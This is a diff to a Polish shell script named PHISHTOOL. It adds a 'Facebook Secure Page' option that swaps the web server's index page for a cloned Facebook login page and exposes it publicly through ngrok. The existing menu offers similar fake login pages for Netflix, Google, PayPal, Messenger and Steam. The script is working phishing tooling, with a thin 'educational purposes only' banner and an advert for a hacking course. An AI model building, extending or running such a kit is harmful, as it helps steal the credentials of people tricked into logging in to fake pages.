@@ -12,6 +12,18 @@ facebook_login_page()
 }
 
 
+
+facebook_secure_login_page()
+{
+	echo "wybrales fb";
+	sudo rm /var/www/html/index.html
+	sudo cp fb_secure/index.html /var/www/html/index.html
+	./ngrok http 80
+	sudo rm /var/www/html/index.html
+}
+
+
+
 netflix_login_page()
 {
 	echo "wybrales Netflixa";
@@ -100,7 +112,7 @@ exit_work()
 
 figlet PHISHTOOL 2.4
 echo " ------------------------------------------------------------------------------ "
-echo "   Narzędzie powstało tylko do celów edukacyjnych! --> phishtool Version 2.4"
+echo "   Narzędzie powstało tylko do celów edukacyjnych! --> phishtool Version 2.5"
 echo " ------------------------------------------------------------------------------ "
 echo -e "\e[5m  KUP KURS NA WWW.EHAKER.PL \e[0m"
 echo "Wybierz opcje"
@@ -115,7 +127,8 @@ echo -e "\e[31m  [7] Google\e[0m"
 echo -e "\e[31m  [8] PayPal\e[0m"
 echo -e "\e[31m  [9] Messenger\e[0m"
 echo -e "\e[31m  [10] Steam\e[0m"
-echo -e "\e[92m  [11] EXIT \e[0m"
+echo -e "\e[31m  [11] Facebook Secure Page\e[0m"
+echo -e "\e[92m  [12] EXIT \e[0m"
 echo "================="
 
 
@@ -135,7 +148,8 @@ case "$opcja" in
   "8") paypal_login_page ;;
   "9") messenger_login_page ;;
   "10") steam_login_page ;;
-  "11") exit_work ;;
+  "11") facebook_secure_login_page ;;
+  "12") exit_work ;;
   *)  clear && ./run.sh
   
 esac
